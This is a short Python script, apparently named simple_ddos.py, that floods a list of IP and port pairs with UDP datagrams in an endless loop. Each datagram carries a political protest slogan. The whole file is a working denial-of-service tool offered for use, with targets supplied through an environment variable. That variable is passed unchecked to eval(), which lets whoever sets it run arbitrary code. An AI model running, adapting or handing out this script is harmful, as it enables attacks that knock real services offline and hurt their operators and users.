import asyncio
import os
import socket
from typing import Tuple, Any

try:
    IP_LIST = eval(os.getenv('UDP_DDOS_IP_LIST'))
except TypeError:
    raise Exception(
        'Example: UDP_DDOS_IP_LIST="((\'127.0.0.1\', 53), (\'192.168.0.1\', 53))" python3 simple_ddos.py\n'
        'Please, set UDP_DDOS_IP_LIST environment variable.'
    )
MESSAGE = bytes('Russian warship - go fuck yourself!', 'utf-8')


async def ddos_udp(ip_pair: Tuple[Any]) -> None:
    opened_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        opened_socket.sendto(MESSAGE, ip_pair)
    except Exception as e:
        print(e)
        opened_socket.close()


async def ddos_loop(ip_list: Tuple[tuple]) -> None:
    while True:
        for ip_pair in ip_list:
            await ddos_udp(ip_pair)
        print('Round finished.')


if __name__ == '__main__':
    loop = asyncio.get_event_loop()

    loop.run_until_complete(ddos_loop(IP_LIST))
